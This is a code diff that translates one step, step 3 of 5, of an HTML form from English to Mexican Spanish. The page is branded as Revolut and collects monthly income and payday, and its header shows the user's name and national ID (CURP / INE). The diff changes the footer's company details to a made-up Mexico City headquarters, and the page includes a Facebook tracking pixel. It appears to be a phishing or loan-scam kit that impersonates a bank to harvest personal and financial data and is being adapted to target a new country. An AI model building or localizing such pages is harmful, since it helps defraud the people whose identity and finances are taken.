@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <script>
 (function(){
@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta content="width=device-width,initial-scale=1" name="viewport"/>
-<title>Income and Payment Day — RevolutBank</title>
+<title>Ingresos y Día de Pago — RevolutBank</title>
 <style>
   @import url("https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap");
 
@@ -281,8 +281,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <div class="progress-text">3 of 5</div>
     </div>
 
-    <h1 class="title"><span data-msg="step5.t04">Income and Payment Day</span></h1>
-    <p class="subtitle"><span data-msg="step5.t05">Please provide your monthly income and payment day</span></p>
+    <h1 class="title"><span data-msg="step5.t04">Ingresos y Día de Pago</span></h1>
+    <p class="subtitle"><span data-msg="step5.t05">Indica tus ingresos mensuales y día de pago</span></p>
 
     <div class="field-group">
       <div class="field-header">
@@ -293,22 +293,22 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           </svg>
         </div>
         <div class="field-labels">
-          <strong>Monthly income</strong>
+          <strong>Mensual income</strong>
           <small>Enter your net income (the amount you receive)</small>
         </div>
       </div>
       <div class="select-display" id="rendaDisplay" tabindex="0">
-        <span><span data-msg="step5.t07">Select your income</span></span>
+        <span><span data-msg="step5.t07">Selecciona tu ingreso</span></span>
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
           <path d="M6 9l6 6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
       </div>
       <div class="select-options" id="rendaOptions">
-        <div class="select-option" data-value="Up to 1.500 €">Up to 1.500 €</div>
-        <div class="select-option" data-value="1.500 € to 3.000 €">1.500 € to 3.000 €</div>
-        <div class="select-option" data-value="3.000 € to 5.000 €">3.000 € to 5.000 €</div>
-        <div class="select-option" data-value="5.000 € to 10.000 €">5.000 € to 10.000 €</div>
-        <div class="select-option" data-value="Above 10.000 €">Above 10.000 €</div>
+        <div class="select-option" data-value="Hasta $ 30,000">Hasta $ 30,000</div>
+        <div class="select-option" data-value="$ 30,000 a $ 60,000">$ 30,000 a $ 60,000</div>
+        <div class="select-option" data-value="$ 60,000 a $ 100,000">$ 60,000 a $ 100,000</div>
+        <div class="select-option" data-value="$ 100,000 a $ 200,000">$ 100,000 a $ 200,000</div>
+        <div class="select-option" data-value="Más de $ 200,000">Más de $ 200,000</div>
       </div>
     </div>
 
@@ -321,8 +321,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           </svg>
         </div>
         <div class="field-labels">
-          <strong>Payment day</strong>
-          <small>What day of the month do you usually get paid?</small>
+          <strong>Día de pago</strong>
+          <small>¿Qué día del mes recibes tu pago?</small>
         </div>
       </div>
       <input class="day-input" id="dayInput" inputmode="numeric" maxlength="2" placeholder="E.g. 5, 10, 15, 25..." type="text"/>
@@ -333,10 +333,10 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         <svg fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" width="18" height="18">
           <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        Back
+        Regresar
       </button>
-      <button class="btn-next" id="btnNext" type="button">
-        <span>Continue</span>
+      <button class="btn-next" id="btnSiguiente" type="button">
+        <span>Continuar</span>
         <div class="spinner"></div>
       </button>
     </div>
@@ -356,7 +356,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <img src="images/revolut-logo.svg" alt="Revolut" style="height:36px;width:auto;display:block;margin:0 auto;"/>
     </div>
     <div class="footer-company">Revolut</div>
-    <div class="footer-meta">Revolut Bank UAB — Headquartered in Lithuania</div>
+    <div class="footer-meta">RevolutBank — Con sede en Ciudad de México</div>
     <div class="footer-badges">
       <span>
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
@@ -375,7 +375,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 </footer>
 
 <script>
-  // Shows name + National ID Number in the header
+  // Shows name + CURP / INE in the header
   (function () {
     const nome = localStorage.getItem('nome') || '';
     const nif  = localStorage.getItem('nif')  || '';
@@ -399,7 +399,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   const rendaDisplay = document.getElementById('rendaDisplay');
   const rendaOptions = document.getElementById('rendaOptions');
   const dayInput = document.getElementById('dayInput');
-  const btnNext = document.getElementById('btnNext');
+  const btnSiguiente = document.getElementById('btnSiguiente');
   const btnVoltar = document.getElementById('btnVoltar');
 
   let rendaSelecionada = '';
@@ -443,9 +443,9 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
   function updateBtn() {
     if (rendaSelecionada && dayInput.value.trim()) {
-      btnNext.classList.add('enabled');
+      btnSiguiente.classList.add('enabled');
     } else {
-      btnNext.classList.remove('enabled');
+      btnSiguiente.classList.remove('enabled');
     }
   }
 
@@ -453,11 +453,11 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     window.location.href = '4.html';
   });
 
-  btnNext.addEventListener('click', () => {
+  btnSiguiente.addEventListener('click', () => {
     if (!rendaSelecionada || !dayInput.value.trim()) return;
     localStorage.setItem('renda', rendaSelecionada);
     localStorage.setItem('diaRecebimento', dayInput.value.trim());
-    btnNext.classList.add('loading');
+    btnSiguiente.classList.add('loading');
     const p = new URLSearchParams(window.location.search);
     p.set('renda', rendaSelecionada);
     p.set('diaRecebimento', dayInput.value.trim());
